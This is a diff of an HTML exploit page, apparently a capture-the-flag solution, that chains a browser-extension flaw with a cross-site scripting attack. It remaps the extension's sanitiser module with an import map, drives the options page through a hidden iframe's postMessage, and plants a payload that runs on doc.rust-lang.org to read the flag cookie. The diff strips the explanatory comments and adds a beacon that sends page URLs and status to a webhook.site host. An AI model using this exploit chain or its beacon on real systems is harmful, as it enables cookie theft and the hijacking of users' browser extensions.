@@ -2,13 +2,6 @@
 <html>
 <head>
 <meta charset="utf-8">
-<!--
-  Import map MUST be present before the extension's cs.js injects its
-  <script type=module>. It remaps the hardcoded jsxss specifier to OUR module,
-  so window[nonce] becomes our payload factory instead of filterXSS.
-  cs.js does:  import N from 'http://localhost:3000/jsxss.js'; window[N]=N
-  then:        previous = window[N](location.href)   -> our raw payload string.
--->
 <script type="importmap">
 { "imports": { "http://localhost:3000/jsxss.js": "./payload.js" } }
 </script>
@@ -16,58 +9,42 @@
 </head>
 <body>
 <script>
-// ==== CONFIG ==================================================
-// EXT_UUID: fixed in browser.ts (firefoxUserPrefs uuids).
 const EXT_UUID = '09a6c422-a354-447d-b4ea-185cb10be869';
 const OPTIONS  = `moz-extension://${EXT_UUID}/options.html`;
-// =============================================================
+const EXFIL    = 'https://webhook.site/f47c89f8-5038-4c47-9d6c-53d7bc38f41c';
+const beacon = (s) => { try { new Image().src = EXFIL + '/b?s=' + encodeURIComponent(s) + '&t=' + Date.now(); } catch(e){} };
 
-// postMessage a URL string to the extension options page.
-// options.js updateConfig(): sets activateOn = new URL(str).origin,
-// gated only by str.href.includes('https://doc.rust-lang.org/').
 function setActivateOn(urlStr) {
   return new Promise((res) => {
     const f = document.createElement('iframe');
     f.style.display = 'none';
     f.src = OPTIONS;
-    f.onload = () => {
-      // give options.js a tick to attach its message listener
-      setTimeout(() => { f.contentWindow.postMessage(urlStr, '*'); res(); }, 300);
-    };
+    f.onload = () => { setTimeout(() => { try{ f.contentWindow.postMessage(urlStr, '*'); }catch(e){ beacon('pm-err:'+e); } res(); }, 300); };
+    f.onerror = () => { beacon('iframe-err'); res(); };
     document.body.appendChild(f);
   });
 }
-
 const wait = (ms) => new Promise(r => setTimeout(r, ms));
 
 (async () => {
   const stage = new URL(location.href).searchParams.get('stage');
+  beacon('load:' + (stage||'init') + ':' + location.href);
 
   if (stage !== 'poison') {
-    // ---- STAGE init (bot landed here via https://doc.rust-lang.org@ATTACKER/) ----
-    // 1) Point cs.js injection at OUR origin. u.origin=our origin,
-    //    href includes the required doc.rust-lang.org substring (in the hash).
     await setActivateOn(location.origin + '/#https://doc.rust-lang.org/');
+    beacon('set-activateOn-self');
     await wait(1500);
-    // 2) Full navigation on our origin whose URL includes the doc substring
-    //    -> background webNavigation.onCompleted fires -> cs.js runs here next load.
-    location.href = location.origin + '/?stage=poison#https://doc.rust-lang.org/';
+    beacon('nav->poison');
+    location.href = '?stage=poison#https://doc.rust-lang.org/';
     return;
   }
 
-  // ---- STAGE poison (activateOn == our origin, cs.js is running on this page) ----
-  // cs.js injects its module -> import map -> /payload.mjs -> window[nonce]=payloadFactory
-  // -> cs.js sends {updateLastUrl, lastPage: payloadFactory(href)} -> previous = RAW payload.
-  // Wait for that runtime message round-trip to persist into storage.local.
   await wait(4000);
-
-  // 3) Flip activateOn back to the real docs so cs.js fires THERE.
+  beacon('poison-waited');
   await setActivateOn('https://doc.rust-lang.org/');
+  beacon('set-activateOn-docs');
   await wait(1500);
-
-  // 4) Navigate to a page under the flag cookie's path (/stable/std/).
-  //    cs.js reads previous (raw payload) FIRST, innerHTMLs it -> <img onerror> in
-  //    doc.rust-lang.org main world -> document.cookie (flag) -> exfil.
+  beacon('nav->docs');
   location.href = 'https://doc.rust-lang.org/stable/std/index.html';
 })();
 </script>
